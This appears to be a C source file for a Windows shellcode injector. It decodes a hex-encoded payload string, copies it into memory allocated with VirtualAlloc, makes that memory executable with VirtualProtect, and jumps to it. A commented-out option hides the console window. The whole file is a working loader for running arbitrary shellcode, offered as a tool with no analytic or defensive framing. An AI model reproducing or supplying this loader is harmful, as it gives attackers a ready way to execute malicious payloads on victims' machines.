#include "SimpleShellcodeInjector.h"
#include <stdio.h>
#include <Windows.h>



int Go(char* shellcode) {
    //Uncomment to Hide cmd window
    //HWND hWnd = GetConsoleWindow();
    //ShowWindow( hWnd, SW_HIDE );

    unsigned int char_in_hex;



    unsigned int iterations = strlen(shellcode);


    unsigned int memory_allocation = strlen(shellcode) / 2; //memory we are going to allocate for shellcode



    for (unsigned int i = 0; i < iterations - 1; i++) {
        sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
        shellcode[i] = (char)char_in_hex;
    }

    void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
    memcpy(exec, shellcode, memory_allocation);
    DWORD ignore;
    VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
    printf("Ready?  Go! ");
    (*(void (*)()) exec)();
    return 0;
}